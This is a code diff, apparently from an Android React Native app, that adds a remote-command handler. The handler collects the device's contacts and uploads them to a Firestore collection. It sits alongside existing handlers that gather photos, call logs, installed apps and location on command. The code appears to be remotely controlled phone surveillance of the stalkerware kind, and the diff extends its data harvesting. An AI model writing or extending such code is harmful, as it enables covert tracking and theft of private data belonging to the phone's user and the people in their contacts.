@@ -8,7 +8,7 @@ import { enviarFotosParaFirebase } from '../funcoes/enviarFotos';
 import { coletarChamadas } from '../funcoes/coletarChamadas';
 import { coletarAppsInstalados } from '../funcoes/coletarAppsInstalados';
 import { coletarLocalizacao } from '../funcoes/localizacao';
-
+import { coletarContatos }        from '../funcoes/coletarContatos';
 export const startComandosListener = () => {
   const dispositivoId = DeviceInfo.getAndroidIdSync();
 
@@ -43,7 +43,12 @@ export const startComandosListener = () => {
             const localizacao = await coletarLocalizacao();
             resposta = { tipo: 'localizacao', dados: localizacao };
           }
-
+          
+else if (comando.tipo === 'coletarContatos') {
+  const { contatos } = await coletarContatos();
+  resposta = { tipo: 'contatos', dados: contatos };
+  
+}
           // salva a resposta em nova coleção
           if (resposta) {
             await firestore().collection('respostas').add({
